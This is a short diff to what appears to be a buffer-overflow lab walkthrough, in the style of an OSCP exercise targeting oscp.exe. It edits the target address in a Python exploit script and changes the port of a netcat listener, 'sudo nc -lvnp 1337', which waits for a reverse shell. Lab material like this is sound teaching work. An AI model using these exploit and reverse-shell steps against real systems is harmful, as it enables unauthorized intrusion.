@@ -287,7 +287,7 @@ reverse shell.
 #!/usr/bin/env python3
 import socket
 
-ip = "10.10.241.243"
+ip = "KALI_IP"
 port = 1337
 
 prefix = "OVERFLOW1 "
@@ -334,10 +334,10 @@ except:
 	print("[-] Could not connect.")
 ```
 
-Start a netcat listener on the Kali box using the LPORT specified in the `msfvenom` command (`4444`).
+Start a netcat listener on the Kali box using the LPORT specified in the `msfvenom` command (`1337`).
 
 ```text
-sudo nc -lvnp 4444
+sudo nc -lvnp 1337
 ```
 
 Restart `oscp.exe` in Immunity and run the modified `exploit.py` script again. The netcat listener should catch a 
